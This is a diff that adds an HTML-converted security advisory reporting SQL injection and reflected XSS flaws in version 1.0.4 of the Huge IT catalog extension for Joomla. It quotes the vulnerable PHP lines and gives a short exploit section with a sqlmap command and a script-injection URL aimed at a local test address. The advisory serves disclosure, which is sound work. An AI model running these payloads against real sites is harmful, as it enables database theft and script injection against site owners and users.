@@ -1,0 +1,122 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 167&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; SQLi and XSS in Huge IT catalog extension v1.0.4 for Joomla&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2016-07-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://extensions.joomla.org/extensions/extension/e-commerce/shopping-cart/catalog">http://extensions.joomla.org/extensions/extension/e-commerce/shopping-cart/catalog</a>"&gt;<a href="http://extensions.joomla.org/extensions/extension/e-commerce/shopping-cart/catalog&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://extensions.joomla.org/extensions/extension/e-commerce/shopping-cart/catalog&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="http://www.huge-it.com/">www.huge-it.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-07-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:info@huge-it.com">info@huge-it.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;This extension is designed to help you display the products in the most attractive way. Joomla Catalog Extension has a stylish design with convenient construction for displaying the product to the customers.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability.
+</p><p>Reflected XSS in file ./views/submissions/tmpl/default.php via message_id parameter:
+</p><p>825:   &amp;lt;input type=&amp;quot;hidden&amp;quot; id=&amp;quot;message_id&amp;quot; value =&amp;quot;&amp;lt;?php echo $<u>GET[&amp;#039;message</u>id&amp;#039;]; ?&amp;gt;&amp;quot; /&amp;gt;
+</p>
+<p>SQL Injection 
+</p><p>in file ./models/submissions.php via id parameter
+</p><pre>
+59-        $query = $db-&amp;gt;getQuery(true);
+60-        $id = JRequest::getVar(&amp;#039;message_id&amp;#039;);
+61-        $this-&amp;gt; updateReadInfo($id);
+62:        $query-&amp;gt;select(&amp;#039;*,#__huge_it_catalog_products.name as product_name, <strong>__huge_it_catalog_asc_seller.id as  message_id&amp;</strong>039;);
+63-        $query-&amp;gt;from(&amp;#039;<strong>__huge_it_catalog_asc_seller,</strong>__huge_it_catalog_products&amp;#039;);
+64-        $query-&amp;gt;where(&amp;#039;#__huge_it_catalog_asc_seller.product_id = #__huge_it_catalog_products.id and <strong>__huge_it_catalog_asc_seller.id = &amp;quot;&amp;</strong>039;.$id.&amp;#039;&amp;quot;&amp;#039;);
+65-        $db-&amp;gt;setQuery($query);
+</pre>
+<p>in file ./models/comment.php via projectId parameter:
+</p><pre>
+56-        $db = JFactory::getDBO();
+57-       $id = JRequest::getVar(&amp;#039;projectId&amp;#039;); 
+58-       $query = $db-&amp;gt;getQuery(true);
+59:        $query-&amp;gt;select(&amp;#039;*,#__huge_it_catalog_reviews.id as comId, #__huge_it_catalog_reviews.name as author_name, <strong>__huge_it_catalog_products.name as product_name&amp;</strong>039;)
+60-             -&amp;gt;from(&amp;#039;#__huge_it_catalog_reviews, <strong>__huge_it_catalog_products&amp;</strong>039;)
+61-         -&amp;gt;where(&amp;#039;#__huge_it_catalog_reviews.product_id = #__huge_it_catalog_products.id and <strong>__huge_it_catalog_products.id = &amp;quot;&amp;</strong>039;.$id.&amp;#039;&amp;quot;&amp;#039;);
+62-        $db-&amp;gt;setQuery($query);</pre>
+<p>in file ./models/rating.php via projectId parameter:
+</p><p>55-        return $results;<br/>
+56-    } <br/>
+57-    <br/>
+58-    public  function getRatingById() {
+</p><pre>
+59-        $db = JFactory::getDBO();
+60:       $id = JRequest::getVar(&amp;#039;projectId&amp;#039;); 
+61-       $query = $db-&amp;gt;getQuery(true);
+62-        $query-&amp;gt;select(&amp;#039;*,<strong>__huge_it_catalog_rating.id as ratId&amp;</strong>039;)
+63-             -&amp;gt;from(&amp;#039;#__huge_it_catalog_rating, <strong>__huge_it_catalog_products&amp;</strong>039;)
+64-         -&amp;gt;where(&amp;#039;#__huge_it_catalog_rating.prod_id = #__huge_it_catalog_products.id and <strong>__huge_it_catalog_products.id = &amp;quot;&amp;</strong>039;.$id.&amp;#039;&amp;quot;&amp;#039;);
+65-        $db-&amp;gt;setQuery($query);</pre>
+<p>in file ./models/catalog.php via id parameter:
+</p><pre>
+45:        $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
+46-        $query = $db-&amp;gt;getQuery(true);
+47-        $query-&amp;gt;select(&amp;#039;<strong>__huge_it_catalog_products.name as name,&amp;</strong>039;
+48-                . &amp;#039;<strong>__huge_it_catalog_products.id ,&amp;</strong>039;
+49-                . &amp;#039;<strong>__huge_it_catalogs.name as catName,&amp;</strong>039;
+50-                . &amp;#039;catalog_id,<strong>__huge_it_catalog_products.description as productDescription,</strong>__huge_it_catalog_products.parameters as productParameters,<strong>__huge_it_catalogs.description,image_url,sl_url,sl_type,price,market_price,single_product_url_type,single_product_url_type,</strong>__huge_it_catalog_products.link_target as productLinkTarget,<strong>__huge_it_catalog_products.ordering,</strong>__huge_it_catalog_products.published,published_in_sl_width&amp;#039;);
+51-        $query-&amp;gt;from(array(&amp;#039;<strong>__huge_it_catalogs&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_it_catalogs&amp;</strong>039;, &amp;#039;<strong>__huge_it_catalog_products&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_it_catalog_products&amp;</strong>039;));
+52-        $query-&amp;gt;where(&amp;#039;<strong>__huge_it_catalogs.id = catalog_id&amp;</strong>039;)-&amp;gt;where(&amp;#039;catalog_id=&amp;#039; . $id_cat);
+53-        $query-&amp;gt;order(&amp;#039;ordering asc&amp;#039;);
+54-       
+55-        $db-&amp;gt;setQuery($query);
+--
+63:        $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
+64-        $query = $db-&amp;gt;getQuery(true);
+65-        $query-&amp;gt;select(&amp;#039;*&amp;#039;);
+66-        $query-&amp;gt;from(&amp;#039;<strong>__huge_it_catalog_products&amp;</strong>039;);
+67-        $query-&amp;gt;where(&amp;#039;catalog_id=&amp;#039; . $id_cat);
+68-        $db-&amp;gt;setQuery($query);
+69-        $results = $db-&amp;gt;loadObjectList();
+70-        return $results;
+</pre>
+<p>71-    }<br/>
+72-<br/>
+73-    public function save($data) {<br/>
+--
+</p><pre>
+121:        $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
+122-        $query = $db-&amp;gt;getQuery(true);
+123-        $query-&amp;gt;update(&amp;#039;<strong>__huge_it_catalogs&amp;</strong>039;)-&amp;gt;set(&amp;#039;name =&amp;quot;&amp;#039; . $name . &amp;#039;&amp;quot;&amp;#039;)-&amp;gt;where(&amp;#039;id=&amp;quot;&amp;#039; . $id_cat . &amp;#039;&amp;quot;&amp;#039;);
+124-        $db-&amp;gt;setQuery($query);
+125-        $db-&amp;gt;execute();
+</pre>
+<p>126-    }<br/>
+127-<br/>
+128-    function selectStyle() {
+</p><pre>
+129-        $db = JFactory::getDBO();
+130-        $data = JRequest::get(&amp;#039;post&amp;#039;);
+131-          $name = $data[&amp;#039;name&amp;#039;];
+--
+136:        $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
+137-        $query = $db-&amp;gt;getQuery(true);
+138-        
+139-        $query-&amp;gt;update(&amp;#039;<strong>__huge_it_catalogs&amp;</strong>039;)
+140-              -&amp;gt;set(&amp;#039;name =&amp;quot;&amp;#039; . $name . &amp;#039;&amp;quot;&amp;#039;)
+141-              -&amp;gt;set(&amp;#039;catalog_list_effects_s =&amp;quot;&amp;#039;.$catalog_effects_list.&amp;#039;&amp;quot;&amp;#039;)
+142-              -&amp;gt;set(&amp;#039;pagination_type =&amp;quot;&amp;#039;.$pagination_type.&amp;#039;&amp;quot;&amp;#039;)
+143-              -&amp;gt;set(&amp;#039;count_into_page =&amp;quot;&amp;#039;.$count_into_page.&amp;#039;&amp;quot;&amp;#039;)
+144-              -&amp;gt;set(&amp;#039;categories =&amp;quot;&amp;#039;.$allCategories.&amp;#039;&amp;quot;&amp;#039;)
+145-              -&amp;gt;where(&amp;#039;id=&amp;quot;&amp;#039; . $id_cat . &amp;#039;&amp;quot;&amp;#039;);
+146-        $db-&amp;gt;setQuery($query);
+</pre>
+<p>--
+</p><p>via removeslide parameter:
+</p><pre>
+208:        $id_cat = JRequest::getVar(&amp;#039;removeslide&amp;#039;);
+209:        $id = JRequest::getVar(&amp;#039;id&amp;#039;);
+210-        $db = JFactory::getDBO();
+211-        $query = $db-&amp;gt;getQuery(true);
+212-        $query-&amp;gt;delete(&amp;#039;<strong>__huge_it_catalog_products&amp;</strong>039;)-&amp;gt;where(&amp;#039;id =&amp;#039; . $id_cat);
+213-        $db-&amp;gt;setQuery($query);
+214-        $db-&amp;gt;execute();
+</pre>
+<p>&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2016-1000119 2016-1000120&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=167"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;SQLi&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ sqlmap  &lt;span style="color: #339933;"&gt;--&lt;/span&gt;load&lt;span style="color: #339933;"&gt;-&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;=&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;.&lt;/span&gt;txt &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://192.168.0.125/administrator/index.php?option=com_catalog&amp;amp;view=catalog&amp;amp;id">http://192.168.0.125/administrator/index.php?option=com_catalog&amp;amp;view=catalog&amp;amp;id</a>=*&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;dbms &lt;a href="<a href="http://www.php.net/mysql">http://www.php.net/mysql</a>"&gt;&lt;span style="color: #990000;"&gt;mysql&lt;/span&gt;&lt;/a&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;XSS&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//192.168.0.125/administrator/index.php?option=com_catalog&amp;amp;view=catalog&amp;amp;id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href=""&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt;
+&lt;/html&gt;
+</p>
+
+</body>
+</html>
